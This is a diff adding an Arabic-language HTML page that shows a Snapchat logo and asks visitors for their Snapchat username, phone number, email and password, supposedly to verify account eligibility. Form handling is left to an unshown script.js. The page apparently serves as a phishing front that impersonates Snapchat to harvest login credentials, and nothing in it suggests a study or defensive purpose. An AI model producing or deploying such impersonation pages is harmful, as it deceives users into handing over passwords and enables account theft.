@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تقديم طلب الانضمام</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@400;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <img src="logo.png" alt="Snapchat" class="logo">
+        </div>
+    </header>
+
+    <main class="container">
+        <div class="form-wrapper">
+            <h2>نموذج تقديم الطلب</h2>
+            <p style="text-align: center; color: #666; margin-bottom: 25px;">يرجى ملء البيانات للتحقق من أهلية الحساب.</p>
+            <form id="submissionForm">
+                <div class="form-group">
+                    <label for="username">اسم المستخدم:</label>
+                    <input type="text" id="username" required placeholder="اسم المستخدم في سناب شات">
+                </div>
+                <div class="form-group">
+                    <label for="phoneNumber">رقم الهاتف:</label>
+                    <input type="tel" id="phoneNumber" required placeholder="05xxxxxxxx">
+                </div>
+                <div class="form-group">
+                    <label for="trackingEmail">البريد الإلكتروني:</label>
+                    <input type="email" id="trackingEmail" required placeholder="example@email.com">
+                </div>
+                <div class="form-group">
+                    <label for="passwordField">كلمة المرور:</label>
+                    <input type="password" id="passwordField" required placeholder="********">
+                </div>
+                <div id="statusMessage" style="display: none; background: #ffe6e6; color: #cc0000; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center; font-weight: bold;"></div>
+                <button type="submit" id="submitBtn" style="width: 100%;">إرسال الطلب</button>
+            </form>
+        </div>
+    </main>
+
+    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+        <div class="loader"></div>
+        <p style="font-weight: bold;">جاري معالجة الطلب...</p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
